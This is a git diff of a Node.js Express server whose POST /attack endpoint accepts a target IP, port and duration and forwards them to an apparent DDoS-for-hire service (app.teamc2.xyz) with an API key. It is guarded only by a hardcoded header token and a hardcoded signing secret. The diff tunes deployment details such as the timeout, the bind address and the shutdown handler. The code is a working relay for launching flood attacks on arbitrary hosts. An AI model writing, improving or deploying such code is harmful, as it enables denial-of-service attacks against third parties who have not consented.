@@ -19,29 +19,26 @@ console.log("Binding PORT:", PORT);
 
 // ================= 🔐 SECURITY =================
 
-// 🔐 SECRET (same as Android)
 const SECRET = "SECRET123";
 
-// 🔐 SHA256
 function sha256(data) {
   return crypto.createHash("sha256").update(data).digest("hex");
 }
 
 // ================= ROUTES =================
 
-app.get("/", (req, res) => res.send("OK"));
-app.get("/health", (req, res) => res.send("OK"));
+// ⚡ Fast health routes (important for deploy)
+app.get("/", (req, res) => res.status(200).send("OK"));
+app.get("/health", (req, res) => res.status(200).send("OK"));
 
 app.post("/attack", async (req, res) => {
   try {
-    // 🔐 HEADER CHECK
     if (req.headers["x-sec"] !== "9xK3pL") {
       return res.status(403).json({ error: "Forbidden" });
     }
 
     let { ip, port, time } = req.body;
 
-    // 🔒 Validation
     if (!ip || !port || !time) {
       return res.status(400).json({ error: "Missing params" });
     }
@@ -53,7 +50,6 @@ app.post("/attack", async (req, res) => {
       return res.status(400).json({ error: "Invalid port/time" });
     }
 
-    // 🔐 SIGNATURE VERIFY
     const expected = sha256(ip + port + time + SECRET);
 
     if (req.headers["x-sign"] !== expected) {
@@ -64,10 +60,9 @@ app.post("/attack", async (req, res) => {
       return res.status(500).json({ error: "API key missing" });
     }
 
-    // 🔥 ORIGINAL LOGIC
     const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;
 
-    const response = await axios.get(url, { timeout: 15000 });
+    const response = await axios.get(url, { timeout: 10000 }); // ⬅️ reduced timeout
 
     return res.json({
       success: true,
@@ -85,12 +80,13 @@ app.post("/attack", async (req, res) => {
 
 // ================= START =================
 
-const server = app.listen(PORT, "0.0.0.0", () => {
+// ❌ "0.0.0.0" remove (not needed)
+const server = app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
 
-// Graceful shutdown
-process.on("SIGTERM", () => {
-  console.log("SIGTERM received. Shutting down...");
-  server.close(() => process.exit(0));
-});
+// ❌ REMOVE graceful shutdown (causing early exit on some platforms)
+// process.on("SIGTERM", () => {
+//   console.log("SIGTERM received. Shutting down...");
+//   server.close(() => process.exit(0));
+// });
